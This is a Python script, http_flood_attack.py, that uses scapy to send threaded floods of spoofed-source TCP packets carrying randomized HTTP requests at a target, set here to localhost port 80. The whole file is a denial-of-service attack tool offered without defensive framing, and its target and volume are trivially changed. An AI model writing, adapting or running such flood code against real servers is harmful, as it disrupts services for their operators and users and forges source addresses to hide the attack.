# http_flood_attack.py
import threading
import random
from scapy.all import IP, TCP, send, Raw
from time import sleep

def generate_random_url():
    paths = ["test", "random", "attack", "sample", "demo", "index.html", "api", "login", "user", "data"]
    params = ["id", "user", "session", "token", "auth"]
    param_values = ["123", "test", "admin", "user", "sample"]
    
    base_path = f"/{random.choice(paths)}"
    if random.random() > 0.5:
        param = random.choice(params)
        value = random.choice(param_values)
        return f"{base_path}?{param}={value}"
    return base_path

def create_http_request(url):
    methods = ["GET", "POST", "HEAD"]
    method = random.choice(methods)
    request = f"{method} {url} HTTP/1.1\r\n"
    request += f"Host: localhost\r\n"
    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    request += f"Accept: text/html,application/xhtml+xml\r\n"
    request += f"Connection: keep-alive\r\n\r\n"
    return request

def http_flood_worker(thread_number, target_ip, target_port, num_packets):
    print(f"Attack Thread {thread_number}: starting...")
    
    for i in range(num_packets):
        try:
            src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
            src_port = random.randint(1024, 65535)
            
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="PA")
            
            url = generate_random_url()
            http_request = create_http_request(url)
            
            packet = ip_layer / tcp_layer / Raw(load=http_request)
            send(packet, verbose=False)
            
            if i % 50 == 0:
                print(f"Thread {thread_number}: sent {i} packets")
                
            sleep(0.01)
            
        except Exception as e:
            print(f"Error in thread {thread_number}: {str(e)}")
            continue

def start_http_flood_attack():
    target_ip = "127.0.0.1"
    target_port = 80
    num_threads = 5
    packets_per_thread = 200
    
    print(f"\nStarting HTTP flood attack with {num_threads} threads")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Each thread will send {packets_per_thread} packets")
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(
            target=http_flood_worker,
            args=(i+1, target_ip, target_port, packets_per_thread)
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    print("HTTP flood attack completed!")